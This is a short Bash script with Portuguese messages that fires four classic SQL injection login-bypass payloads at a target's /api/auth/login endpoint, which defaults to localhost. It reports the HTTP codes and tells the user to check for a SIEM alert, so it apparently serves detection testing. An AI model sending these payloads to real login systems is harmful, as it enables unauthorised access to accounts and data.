#!/usr/bin/env bash

set -euo pipefail
TARGET="${1:-http://localhost}"
echo "🚨 Ataque: SQL Injection (Login Bypass)"
echo "  Alvo: $TARGET/api/auth/login"
echo "  Tentativas: 4 payloads de SQLi"
for payload in \
    "' OR 1=1 --" \
    "' OR '1'='1" \
    "admin' --" \
    "admin' OR '1'='1"; do
    echo "  -> username: $payload"
    curl -s -o /dev/null -w "     HTTP %{http_code}\n" \
        -X POST "$TARGET/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "$(printf '{"username":"%s","password":"qualquer"}' "$payload")"
done
echo "  ✔ SQLi concluído (verifique alerta no SIEM)"
